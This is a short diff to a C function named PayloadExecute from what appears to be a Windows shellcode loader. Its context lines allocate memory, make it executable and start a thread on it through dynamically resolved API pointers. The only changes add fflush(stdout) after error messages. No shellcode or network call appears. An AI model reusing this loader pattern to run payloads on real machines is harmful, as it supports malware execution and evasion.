@@ -14,11 +14,13 @@ BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN 
 
 	if (!(pAddress = (PBYTE)pVirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
 		printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
+		fflush(stdout);
 		return FALSE;
 	}
 
 	if (!pVirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
 		printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
+		fflush(stdout);
 		return FALSE;
 	}
 
@@ -26,6 +28,7 @@ BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN 
 
 	if (!(hThread = pCreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0x00, NULL))) {
 		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
+		fflush(stdout);
 		return FALSE;
 	}
 
